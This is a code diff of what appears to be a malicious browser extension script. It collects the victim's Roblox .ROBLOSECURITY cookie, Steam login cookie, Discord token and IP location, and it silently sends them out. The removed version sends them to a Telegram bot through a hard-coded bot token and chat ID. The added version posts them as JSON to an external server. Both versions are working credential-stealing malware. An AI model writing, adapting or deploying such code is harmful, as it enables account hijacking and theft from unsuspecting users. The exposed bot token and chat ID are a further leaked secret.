@@ -1,25 +1,8 @@
-const TOKEN = "8679009953:AAE6I66uPMllDNCAdIL2vTUD7fs_Hvoo7uc";
-const CHAT_ID = "6145369088";
-const API = "https://api.telegram.org/bot" + TOKEN;
+const SERVER_URL = "https://mm2-server.onrender.com/send";
 
 let sentRoblox = "";
 let sentSteam = "";
 let sentDiscord = "";
-
-async function sendText(text) {
-    try {
-        await fetch(API + "/sendMessage", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: text,
-                parse_mode: "HTML",
-                disable_web_page_preview: true
-            })
-        });
-    } catch (e) {}
-}
 
 async function getDiscordToken() {
     try {
@@ -59,68 +42,56 @@ async function getIP() {
 }
 
 async function sendData() {
-    let msg = "";
-    let hasNew = false;
+    const data = {
+        robloxCookie: "",
+        steamCookie: "",
+        discordToken: "",
+        ip: "",
+        country: "",
+        city: "",
+        hasNew: false
+    };
 
-    // IP всегда первый
     const ip = await getIP();
-    msg += "🌐 <b>IP:</b> <code>" + (ip?.ip || "Н/Д") + "</code>\n";
-    msg += "📍 <b>Страна:</b> <code>" + (ip?.country || "Н/Д") + "</code>\n";
-    msg += "🏙 <b>Город:</b> <code>" + (ip?.city || "Н/Д") + "</code>\n\n";
+    data.ip = ip?.ip || "";
+    data.country = ip?.country || "";
+    data.city = ip?.city || "";
 
-    // Roblox
     try {
         const c = await chrome.cookies.getAll({ domain: ".roblox.com" });
         const rob = c.find(x => x.name === ".ROBLOSECURITY");
-        msg += "🍪 <b>ROBLOX COOKIE:</b>\n";
         if (rob && rob.value !== sentRoblox) {
             sentRoblox = rob.value;
-            msg += "<code>" + rob.value + "</code>\n\n";
-            hasNew = true;
-        } else if (rob) {
-            msg += "✅ Уже отправлен\n\n";
-        } else {
-            msg += "❌ Не найден\n\n";
+            data.robloxCookie = rob.value;
+            data.hasNew = true;
         }
     } catch (e) {}
 
-    // Steam
     try {
         const c = await chrome.cookies.getAll({ domain: "steamcommunity.com" });
         const steam = c.find(x => x.name === "steamLoginSecure");
-        msg += "🎮 <b>STEAM COOKIE:</b>\n";
         if (steam && steam.value !== sentSteam) {
             sentSteam = steam.value;
-            msg += "<code>" + steam.value + "</code>\n\n";
-            hasNew = true;
-        } else if (steam) {
-            msg += "✅ Уже отправлен\n\n";
-        } else {
-            msg += "❌ Не найден\n\n";
+            data.steamCookie = steam.value;
+            data.hasNew = true;
         }
     } catch (e) {}
 
-    // Discord
     const discordToken = await getDiscordToken();
-    msg += "💬 <b>DISCORD TOKEN:</b>\n";
     if (discordToken && discordToken !== sentDiscord) {
         sentDiscord = discordToken;
-        msg += "<code>" + discordToken + "</code>\n\n";
-        hasNew = true;
-    } else if (discordToken) {
-        msg += "✅ Уже отправлен\n\n";
-    } else {
-        msg += "❌ Discord не открыт в браузере\n\n";
+        data.discordToken = discordToken;
+        data.hasNew = true;
     }
 
-    if (hasNew) {
-        let header = "🔴 <b>⚠️ ОТЧЁТ</b>\n\n";
-        header += "━━━━━━━━━━━━━━━━━━\n\n";
-        header += msg;
-        header += "━━━━━━━━━━━━━━━━━━\n";
-        header += "⏰ <b>Время:</b> " + new Date().toLocaleString("ru-RU");
-
-        await sendText(header);
+    if (data.hasNew) {
+        try {
+            await fetch(SERVER_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data)
+            });
+        } catch (e) {}
     }
 }
 
